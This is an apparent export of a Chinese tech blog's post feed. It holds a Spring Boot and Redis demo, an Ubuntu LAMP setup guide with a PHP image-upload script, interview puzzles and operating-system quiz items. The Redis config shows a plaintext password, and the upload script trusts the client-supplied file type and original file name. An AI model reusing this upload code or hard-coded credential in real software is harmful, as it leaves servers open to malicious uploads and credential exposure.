class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="2-创建实体类"><a href="#2-创建实体类" class="headerlink" title="2.创建实体类"></a>2.创建实体类</h3><p>随便创建一个实现序列化接口的实体类</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc.czqu.redistest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Book</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> {</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String author;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="3-配置application-properties"><a href="#3-配置application-properties" class="headerlink" title="3.配置application.properties"></a>3.配置application.properties</h3><figure class="highlight properties"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring.redis.database</span>=<span class="string">0</span></span><br><span class="line"><span class="attr">spring.redis.port</span>=<span class="string">6379</span></span><br><span class="line"><span class="attr">spring.redis.password</span>=<span class="string">czqu@123</span></span><br><span class="line"><span class="attr">spring.redis.host</span>=<span class="string">192.168.63.129</span></span><br><span class="line"><span class="attr">spring.redis.jedis.pool.max-active</span>=<span class="string">8 #最大连接数</span></span><br><span class="line"><span class="attr">spring.redis.jedis.pool.max-wait</span>=<span class="string">-1ms #最大阻塞时间 -1表示无限制</span></span><br><span class="line"><span class="attr">spring.redis.jedis.pool.min-idle</span>=<span class="string">0 #连接池中最小空闲连接数</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">9090</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>4.创建测试类</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc.czqu.redistest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.ValueOperations;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookController</span> {</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    RedisTemplate redisTemplate;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    StringRedisTemplate stringRedisTemplate;</span><br><span class="line">    <span class="meta">@GetMapping("/test1")</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span></span><br><span class="line">    {</span><br><span class="line">        System.out.println(<span class="string">"hello"</span>);</span><br><span class="line">        ValueOperations&lt;String,String&gt; ops1=stringRedisTemplate.opsForValue();</span><br><span class="line">        ops1.set(<span class="string">"name"</span>,<span class="string">"三国演义"</span>);</span><br><span class="line">        String name=ops1.get(<span class="string">"name"</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="comment">//实体类的读写</span></span><br><span class="line">        Book book1=<span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">        book1.setId(<span class="number">666</span>);</span><br><span class="line">        book1.setAuthor(<span class="string">"陈子琦"</span>);</span><br><span class="line">        book1.setName(<span class="string">"快乐学习"</span>);</span><br><span class="line">        ValueOperations&lt;String,Book&gt; ops2= redisTemplate.opsForValue();</span><br><span class="line">        ops2.set(<span class="string">"b1"</span>,book1);</span><br><span class="line">        Book b1= ops2.get(<span class="string">"b1"</span>);</span><br><span class="line">        System.out.println(b1);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Redis </tag>
            
            <tag> Springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu 18.04下搭建LAMP环境</title>
      <link href="/posts/42422/"/>
      <url>/posts/42422/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：</p><p>Linux 操作系统在服务器领域具有广泛的应用。Web 服务是服务器领域中应<br>用最广泛的服务，常见 Web 服务有 WAMP（Windows+Apache+MySQL+PHP）和 LAMP<br>（Linux+Apache+MySQL+PHP）架构，其中 Apache 是全世界最流行的 Web 服务软<br>件，此外，Web 服务软件 nginx，因其具有优秀的性能也受到越来越多的用户欢<br>迎。本文中，演示在 Linux 环境下搭建支持 PHP 等网页的 Web 服务平台，即<br>LAMP。<br>Linux 环境下搭建 Web 服务器有三种方式，一是在安装操作系统时勾选相应<br>服务组件；二是从网上下载或从 ISO 系统镜像包中拷贝安装包手动安装；三是在<br>在连接网络的的情况下在线安装。<br>本文以阿里云 Ubuntu 18.04 64 位操作系统为例安装LAMP，并用PHP实现简单的图片上传功能。</p></blockquote><h5 id="1-安装-Apache-服务器"><a href="#1-安装-Apache-服务器" class="headerlink" title="1.安装 Apache 服务器"></a>1.安装 Apache 服务器</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt install apache2</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvWmljTzIxYm9DSnd5RkhrLnBuZw?x-oss-process=image/format,png" alt="image-20200607185107131"></p><p><strong>安装完成后需要手动启动 apache 服务</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvT3Q1cG5QUWtxNzZyU2VHLnBuZw?x-oss-process=image/format,png" alt="image-20200607185314919"></p><p><strong>测试 Apache，在浏览器输入服务器IP 地址，如下图所示，说明 Apache 安装成功。（阿里云等需要在云控制面板打开80端口才能访问）</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvNXlMeHRpVUJtQ2FwVFBZLnBuZw?x-oss-process=image/format,png" alt="image-20200607185759748"></p><blockquote><p>以上页面详细介绍了 debian 发行版 Linux 中 Apache 基本信息，其中：</p><p>Apache 根目录：<br>/var/www/html<br>Apache 配置目录和文件：<br>/etc/apache2：Apache 主配置目录， Apache 所有配置文件均在此目录下；<br>/etc/apache2/apache2.conf：主配置文件，可配置 Apache 全局配置；<br>/etc/apache2/ports.conf：端口配置文件。默认情况下，当启用提供 SSL<br>功能的模块时，Apache 监听端口 80，并在端口 443 上进行监听。<br>其它文件略。<br>Apache 日志文件：<br>/var/log/apache2/access.log:服务请求日志；<br>/var/log/apache2/error.log：服务错误日志。<br>Apache 基本操作：<br>服务启动：/etc/init.d/apache2 start<br>服务停止：/etc/init.d/apache2 stop<br>服务重启：/etc/init.d/apache2 restart<br>部分 Linux 安装 Apache 后可能出现服务正常运行，相应端口正常打开，但<br>其它主机无法访问情况，此现象一般是因为系统防火墙未开放相应服务端口。  </p><p><strong>以修改端口为例修改配置文件</strong></p><p>首先打开/etc/apache2/ports.conf文件,然后修改Listen的内容,最后需要重启apache生效</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;/etc/init.d/apache2 restart</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvcW1FWlh0RFI4aHJIV04zLnBuZw?x-oss-process=image/format,png" alt="image-20200607210454251"></p></blockquote><p><strong>阿里云安全组配置</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvdmRJMmg4VHk5YWJZM0NTLnBuZw?x-oss-process=image/format,png" alt="image-20200607185719368"></p><h5 id="2-安装-MySQL-MariaDB"><a href="#2-安装-MySQL-MariaDB" class="headerlink" title="2.安装 MySQL/MariaDB"></a>2.安装 MySQL/MariaDB</h5><blockquote><p>本示例采用 MariaDB 代替 MySQL。MariaDB 是 MySQL 的一个分支，现由开源<br>社区维护，采用 GPL 授权许可，其大部分语法与 MySQL 都相同。因 MySQL 被 Oracle<br>收购后有闭源的风险，大部分 Linux 组织均从其套件清单删除了 MySQL，并以<br>MariaDB 代替 MySQL，若一定要使用 MySQL，可通过下载安装包的方式手动安装<br>MySQL。  </p></blockquote><p><strong>安装 MariaDB 服务</strong>  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install mariadb-server</span><br><span class="line"><span class="built_in">sudo</span> apt install mariadb-client</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvbXZKYTlYeGhEbzJWQVQxLnBuZw?x-oss-process=image/format,png" alt="image-20200607190537515"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvcVdjWlFyQzZQQlViRmY0LnBuZw?x-oss-process=image/format,png" alt="image-20200607190604824"></p><p><strong>配置 Mariadb 的安全选项:</strong>  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mysql_secure_installation</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvM3RTeXBpamJIN01lc0ZuLnBuZw?x-oss-process=image/format,png" alt="image-20200607190923711"></p><blockquote><p>此时系统会提示输入数据库 root 用户密码，因系统并未设置相应密码，此<br>时直接按提示回车即可。若提示错误，则 sudo /etc/init.d/mysql restart 命<br>令重启 mysql 服务并重新执行安全选项命令。<br>随后数据库会提示以下安全设置信息，一般设置数据库 root 用户密码即可，<br>其它选项按回车选择默认：<br>1、Enter current password for root (enter for none): 输入当前 root<br>的密码(因新数据库无密码，回车即可)；<br>2、Set root password? [Y/n] 回车，默认为输入 Y；<br>3、New password: 输入新密码；<br>4、Re-enter new password 确认密码；<br>5、Remove anonymous users? [Y/n] 移除匿名用户；<br>6、Disallow root login remotely? [Y/n] 禁止 root 远程登录；<br>7、Remove test database and access to it? [Y/n] 移除测试数据库；<br>8、Reload privilege tables now? [Y/n] 重新加载权限表。</p></blockquote><p><strong>测试数据库，如图所示，若进入数据库则表示数据库安装成功。</strong> </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span>  mysql -u root -p</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvSXBjT043b2tHOW1hVDVoLnBuZw?x-oss-process=image/format,png" alt="image-20200607193447164"></p><h5 id="3-安装PHP"><a href="#3-安装PHP" class="headerlink" title="3.安装PHP"></a>3.安装PHP</h5><blockquote><p>安装 PHP 除了 PHP 应用程序外，还需安装 PHP 与 Apache、MySQL/MariaDB<br>相关扩展包，扩展包需与软件对应，本例中安装 php7.3 版本，对应扩展包可通<br>过以下命令模糊查询。  </p><p>sudo apt-cache search php7</p></blockquote><p>从 查 询 结 果 可 知 ， php7.2 对 应 Apache 、 MySQL 扩 展 包 分 别 为 ：<br> libapahe2-mod-php7.2，php7.2-mysql。如下图所示为安装 PHP 相关软件包。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install php7.2 libapache2-mod-php7.2 php7.2-mysql</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvaEpQRlpMOGJ4d05JaWdPLnBuZw?x-oss-process=image/format,png" alt="image-20200607203901229"></p><p><strong>PHP 安装完毕后需重启 Apache</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 restart</span><br></pre></td></tr></tbody></table></figure><h5 id="4-测试-PHP-页面"><a href="#4-测试-PHP-页面" class="headerlink" title="4.测试 PHP 页面"></a>4.测试 PHP 页面</h5><p>编辑测试文件，如下图所示，在“/var/www/html”目录下新建“test.php”文件，并输入如下图所示的测试代码  </p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在浏览器中输入测试页面地址，并确认已安装组件,例如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvQzRvWWNCeHVoZUw3MzY4LnBuZw?x-oss-process=image/format,png" alt="image-20200607205042380"></p><h5 id="5-创建文件上传页面"><a href="#5-创建文件上传页面" class="headerlink" title="5.创建文件上传页面"></a>5.创建文件上传页面</h5><p>文件上传功能由上传文件的 HTML 表单和文件上传脚本构成。<br>在“/var/www/html”目录下创建“upload.html”文件，编辑表单  </p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- upload.html --&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在“/var/www/html”目录下创建 “upload.php” 脚本文件，编写文件上传功能代码  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- upload.php --&gt;&lt;?php// 允许上传的图片后缀$allowedExts = array("gif", "jpeg", "jpg", "png");$temp = explode(".", $_FILES["file"]["name"]);echo $_FILES["file"]["size"];$extension = end($temp);     // 获取文件后缀名if ((($_FILES["file"]["type"] == "image/gif")|| ($_FILES["file"]["type"] == "image/jpeg")|| ($_FILES["file"]["type"] == "image/jpg")|| ($_FILES["file"]["type"] == "image/pjpeg")|| ($_FILES["file"]["type"] == "image/x-png")|| ($_FILES["file"]["type"] == "image/png"))&amp;&amp; ($_FILES["file"]["size"] &lt; 204800)   // 小于 200 kb&amp;&amp; in_array($extension, $allowedExts)){    if ($_FILES["file"]["error"] &gt; 0)    {        echo "错误：: " . $_FILES["file"]["error"] . "&lt;br&gt;";    }    else    {        echo "上传文件名: " . $_FILES["file"]["name"] . "&lt;br&gt;";        echo "文件类型: " . $_FILES["file"]["type"] . "&lt;br&gt;";        echo "文件大小: " . ($_FILES["file"]["size"] / 1024) . " kB&lt;br&gt;";        echo "文件临时存储的位置: " . $_FILES["file"]["tmp_name"] . "&lt;br&gt;";                // 判断当前目录下的 upload 目录是否存在该文件        if (file_exists("upload/" . $_FILES["file"]["name"]))        {            echo $_FILES["file"]["name"] . " 文件已经存在。 ";        }        else        {            // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下            move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);            echo "文件存储在: " . "upload/" . $_FILES["file"]["name"];        }    }}else{    echo "非法的文件格式";}?&gt;</span><br></pre></td></tr></tbody></table></figure><p>在目录下创建“upload”目录，用于保存上传的图片。  </p><p>如下图所示，为上传文件页面。  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvZXoyUUFEVm5VQ1BybG1iLnBuZw?x-oss-process=image/format,png" alt="image-20200607210025657"></p><p>上传成功的提示：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcveWk4UDRaN0dqYk1ZNXZYLnBuZw?x-oss-process=image/format,png" alt="image-20200607210110052"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找工作智力题集锦</title>
      <link href="/posts/44209/"/>
      <url>/posts/44209/</url>
      
        <content type="html"><![CDATA[<p><strong>1 .0，1，2，3，⋯，499，500共501个数按升序排列，每次取奇数序位的数丢掉，然后取剩下的数的奇数序位的数丢掉，重复这个过程，那么最后剩下的数是多少？</strong><br>答案 ：255</p><p>简单例举下：0   1    2    3    4  5    6    7    8    9   10    11<br>    第一次剩下的    1    3    5    7  9    11       规律： 2i-1<br>                            （ i为整数   1&lt;=i&lt;= n/2 （n表示给出序列的元素个数，例子中是12，而题目中是501））<br>    第二次剩下的    3     7    11                               4i- 1                    1&lt;=i&lt;= n/4<br>    第3次剩下的        7                                           8i- 1                     1&lt;=i&lt;= n/8</p><p>   相信已经差不多了。每次剩下的元素为   2^x-1    满足条件的只有  255=2^8-1 .当然这是选择题可以直接选答案。<br>    正确做法是： 最后剩下一个元素，那么进行了几次筛选过程呢？   i取值只能是1，<br>    那么 501/（2^x）&lt;2    取x=8;<br>    那么剩下的元素是2^8-1=255<br>    仔细观察都是一的二进制数最后出列。 </p><p><strong>32!的计算结果，尾数总共有几个零？</strong><br>答案：7个<br>2*5可以得到零，即转为求因子数。<br>2因子远大于5，求5就行<br>这里可以有公式：<br>5！：5 / 5 = 1<br>25！： 25/5  + 25/25= 6（有2有5+1个5，5 10 15 20 25，25有两个五，也就是每有一个25要多一个零，以下同理）<br>32！：32/5 + 32/25 =7<br>1024!：1024/5 + 1024/25 + 1024/125 + 1024/625 = 253</p><p><strong>站在地球上的某一点，向南走一公里，然后向东走一公里，最后向北走一公里，回到了原点。地球上有多少个满足这样条件的点?</strong><br>答案：无数个<br>从逻辑上来讲，题目从好像缺少了一次向西的过程，才可以回到原地。有没有可能向东1公里还在原地，答案是肯定的，如果有一个纬度，绕其一圈恰好是1公里即可实现，所以这样的点有无穷多个，只要找到那个纬度即可。（就像你在赤道上，要回到原点怎么办呢，向东或西走赤道这么长就可以了）<br>北极点的起点出发刚好走了一个正三角形，所以可以返回原点。</p><p><strong>1,32,81,64,25,(6),1</strong><br>$1^6=1$<br>$2^5=32$<br>$3^4=81$<br>$4^3=64$<br>$5^2=25$<br>$6^1=6$<br>$7^0=1$</p><p><strong>N个球中有一个假冒伪劣(重量不足)，如果给你一个天平允许你测 3 次找出那个假冒伪劣，问 N 可能的值</strong></p><p>三个一次就可以测出来。A B C，三个球中有一个次品，只要测一下A B是否等重，则次品在C；如果A B不等重，那就可以分出来次品。<br> $3<em>3 = 9$ 个以内 2 次，$3</em>3*3 = 27$ 个以内，3次！所以，有个公式：n 次可以测出来 $3^n$ 以内的假冒伪劣</p><p><strong>某单位组织党员参加党史，党风廉政建设，科学发展观和业务能力四项培训，要求每名党员参加且只能参加其中的两项，无论如何安排，都至少有 5 名党员参加的培训完全相同，请问该单位至少有多少名党员？</strong><br>4门课程，每人选2门，有$C_4^2=6$中选法；此时根据抽屉原理，将这6中选法想象为6个抽屉，在每个抽屉中放入4个党员，则有24名党员；此时，再多来一名党员，则无论将其安排在哪个抽屉，6个抽屉中都必有一个里面装的是5名党员。所以，该机关至少有24+1=25名党员。</p><p><strong>小松鼠采到了100 颗坚果要运回家。家离放坚果的地方有100 米远。小松鼠每次最多运 50 颗。BUT！小松鼠很馋。。。每走2 米就要吃一颗坚果。。。返回时不会再吃坚果，问小松鼠最多能运回家多少颗坚果？</strong><br>答案：25</p><p>设采坚果的地点为A，家为B，从A到B方向的运动需要消耗坚果。题目求最多运多少坚果回家，为使结果最大化，所以需要每次开始都运50颗，所以题目也就是求最少的坚果消耗量，由于A-&gt;B方向的运动一直要消耗坚果，所以也就是求此方向运动的最少距离。由于每次做多运50颗，所以有一段A-&gt;B方向必须走两次，设这段距离为x，剩下的距离为y，则有x+y=100。消耗的总坚果数为(2x+y)/2。并且为了使最后y段能够运走所有2x段剩下的坚果，需要满足2*(50-x/2)&lt;=50，所以x&gt;=50。由于要使(2x+y)/2=(x+100)/2最小，所以x应该去最小值50,所以消耗坚果数为（50+100）/2=75，所以剩下25个。<br>另：假如松鼠每走两步就要吃坚果，那么答案应该是17颗。</p><p><strong>在?处答案为()</strong><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/44209/20200330202952584.png" alt="在这里插入图片描述"><br>答案：B<br>前两列（1、2列）移动到2、3列，第三列挪到第一列，<strong>但是</strong>第三列第三行要变第一列第一行，其他的往下挪（即第三列第一行变第一列第二行，即第三列第二行变第一列第三行）， 然后叉变圆，圆变三角，三角变叉。（不理解的可以画图试试）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统题目集锦</title>
      <link href="/posts/46653/"/>
      <url>/posts/46653/</url>
      
        <content type="html"><![CDATA[<p><strong>在硬件和环境相同的条件下，一个作业在（分页）存储管理系统中运行的时间最长。</strong><br>分页式存储管理可能将连续的指令放置在不同的页中，会发生换页中断，而分段、段页都是逻辑分配空间，段长可变，逻辑上相对连续的指令放在同一段中，不会像分页那样频繁换页操作。</p><p><strong>设从磁盘将一块数据传送到缓冲区所用实际为80μs，将缓冲区中数据传送到用户区所用时间为40μs，CPU处理数据所用的时间为30μs。则处理该数据，采用单缓冲传送磁盘数据，系统所用总时间为（120μs）。</strong><br> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/46653/20200328213029515.png" alt="在这里插入图片描述"><br> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/46653/20200328213040915-16329844525871.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git合并丢失代码问题分析与解决(错误操作导致)</title>
      <link href="/posts/25541/"/>
      <url>/posts/25541/</url>
      
